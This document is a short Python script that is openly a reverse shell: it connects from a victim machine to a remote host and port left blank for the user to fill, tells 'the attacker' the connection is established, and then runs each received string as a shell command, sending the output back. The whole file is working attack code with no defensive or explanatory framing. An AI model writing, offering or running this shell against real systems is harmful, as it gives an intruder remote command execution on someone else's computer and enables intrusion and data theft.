#!/usr/bin/python

import socket,subprocess
HOST = ''    # The remote host that should recieve the handle
PORT =       # The same port as used by the server eg. 443

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create a tcp socket
s.connect((HOST, PORT)) # connect to the server

s.send('[*] Connection Established!') # tell the attacker that he is successfully connected to the victim

while 1:
     data = s.recv(1024)
     if data == "quit": break
     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     stdout_value = proc.stdout.read() + proc.stderr.read()
     s.send(stdout_value) # send the output of the command executed to the attacker
s.close()
